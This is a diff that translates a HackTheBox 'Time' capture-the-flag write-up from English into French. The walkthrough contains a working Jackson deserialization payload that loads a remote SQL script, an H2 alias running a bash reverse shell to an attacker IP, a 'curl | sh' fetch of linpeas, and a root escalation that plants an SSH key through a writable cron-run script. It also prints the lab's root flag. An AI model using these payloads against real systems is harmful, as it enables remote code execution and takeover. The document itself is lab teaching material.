@@ -2,11 +2,14 @@
 title: " HackTheBox - [Time] "
 description: Simple writeup of the Time box on Hackthebox.
 ---
+
 ![Time](https://media.discordapp.net/attachments/490431433559506954/832933487954231336/screenshot-193.png)
+
 
 ![r](https://cdn.discordapp.com/attachments/519930659620257797/832739076687134800/68747470733a2f2f692e696d6775722e636f6d2f344d37495777502e676966.gif)
 
 ## 0x1 - Scanning port
+
 
 ```sh
 PORT STATE SERVICE VERSION 
@@ -18,32 +21,37 @@ protocol 2.0)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We can see that there is the ssh/22 port and the 80 / http port which are open.
+On peut apercevoir qu'il y a le port ssh/22 et le port 80/http qui sont ouverts.
 
-We are going to see the http/80 port to see what is interesting.
+Nous allons jeter un coup d'œil au port http/80 pour voir ce qu'il y'a d'intéressant.
 
-We see an online json beautifier & Validator with 2 options, "Beatify" & "Validate!(Beta)".
+
+Nous voyons un embellisseur et un validateur json en ligne avec 2 options, "Beatify" et "Validate! (Beta)".
 
 ![A](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)
 
-I intercepted both options in burpsuite and i have just input sample JSON datain the input field, select Beautify option and click on the PROCESS button. We can see this working. 
-Now try the same on "Validate! (Beta)" options : 
+J'ai intercepté les deux options dans burpsuite et je viens de saisir un échantillon de données ``JSON`` dans le champ de saisie, sélectionnez l'option ``Beautify`` et cliquez sur le bouton ``PROCESS`` . Nous pouvons voir que cela fonctionne. 
+
+Maintenant, essayez la même chose sur ``"Validate! (Beta)"`` options : 
 
 ![a](https://media.discordapp.net/attachments/490431433559506954/832954307493756969/unknown.png)
 
-You got an error ! 
-```
+
+Vous avez une erreur!
+
+```sh
 Validation failed: Unhandled Java exception:com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object
 ```
 
 
-## 0x2 - Foothold
+## 0x2 - User 
 
-I pasted the error message: ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` on google, I came across an article from stackoverflow.  <a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">here article</a>
+J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` Je suis tombé sur un article de stackoverflow, expliquant l'erreur en question.
+<a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">here article</a>
 
-The error is related to Jackson Polymorphic Deserialization expected START_ARRAY.
+Après l'avoir lu, j'ai compris que l'erreur est liée à Jackson Polymorphic Deserialization expected START_ARRAY.
 
-Now, you need to create a inject.sql files and add a reverse shell to have it call back to me. :
+Maintenant, vous devez créer un fichier inject.sql et ajouter un reverse shell en bash pour qu'il me rappelle. :
 
 ```sh
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -54,33 +62,35 @@ $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
 ```
 
-Now, start a netcat listener :
+Maintenant démarrer listenner avec netcat :
 
 ```sh
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
-Now inject the payload to : "Validate!(Beta)".
+Et injecter votre payload sur l'option : "Validate!(Beta)".
 
 ```sh
 [“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
 ```
 
-and you got a reverseshell running as the user pericles.
+Et vous obtenez un reverse shell sur l'user pericles.
 
 ```sh
 listening on [any] 1337 ...
 connect to [10.10.14.90] from (UNKNOWN) [10.10.10.214] 42212
 ```
 
-Now for a good stable shell, type :
+
+Pour avoir un reverse shell stable type :
 
 ```sh
 $python -c “import pty;pty.spawn(‘/bin/bash’)”
 $export TERM=xterm
 ```
-Got the user flag : 
+
+Vous obtenez l'user flag :
 
 ```
 pericles@time:/home/pericles$ cat user.txt 
@@ -89,31 +99,39 @@ cat user.txt
 ```
 ## 0x3 - Privilege Escalation
 
-Try to upload linpeas ( LinPEAS is a script that search for possible paths to escalate privileges on Linux )
+Maintenant nous allons upload Linpeas ( LinPEAS est un script qui recherche des chemins possibles pour augmenter les privilèges sous Linux ).
 
-Install linpeas <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>
+Installer linpeas : <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>
 
-Start python server where are your linpeas.sh file and curl to the target machine.
+Start un serveur python où se trouve votre fichier linpeas.sh et curl vers la machine cible.
 
 ```
 sudo python -m SimpleHTTPServer 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
 ```
 
-We can see that root has been accessing this file: “/usr/bin/timer_backup.sh”. Which is owned by your user and writeable.
+Nous pouvons voir que root a accédé à ce fichier: «/usr/bin/timer_backup.sh». Qui appartient à votre utilisateur et est accessible en écriture et writeable.
+
 
 ![ak](https://media.discordapp.net/attachments/490431433559506954/832944544067878932/unknown.png)
 
-You need to create your ssh key, add our SSH public key to the authorized_keys file on the server. To do this follow commands :
+
+Vous devez créer votre clé ssh, ajouter notre clé publique SSH au fichier allowed_keys sur le serveur. Pour ce faire, suivez les commandes suivants :
+
 
 ```sh
 ssh-keygen
 ( no passphrase ) 
-Copy your id_rsa.pub key 
-and paste this command in target machine : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
+Copier votre clée id_rsa.pub key 
+Et effectuez cette command sur la machine cible. : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
 ```
 
-Now just : ```chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214```
+Maintenant vous faites un ``chmod 600`` pour avoirs les permissions puis vous vous connecter au port ssh avec la clée ``id_rsa`` : 
+
+
+```sh
+chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214
+```
 
 Done ! 
 
@@ -124,12 +142,13 @@ root@time:~# id
 uid=0(root) gid=0(root) groups=0(root) 
 ```
 
-Got the root flag 
+Nous avons root la machine avec succès.
 
 ```sh
 root@time:~# cat /root/root.txt
 adsd9hf0c86b8786477033415e3018a4
 ```
+
 ##  Summary Of Knowledge : 
 
 - Java Deserialization
@@ -141,4 +160,5 @@ adsd9hf0c86b8786477033415e3018a4
 - Github : https://github.com/x0ld
 - Twitter : @x0ld7
 - HTB : https://www.hackthebox.eu/home/users/profile/491690
+
 
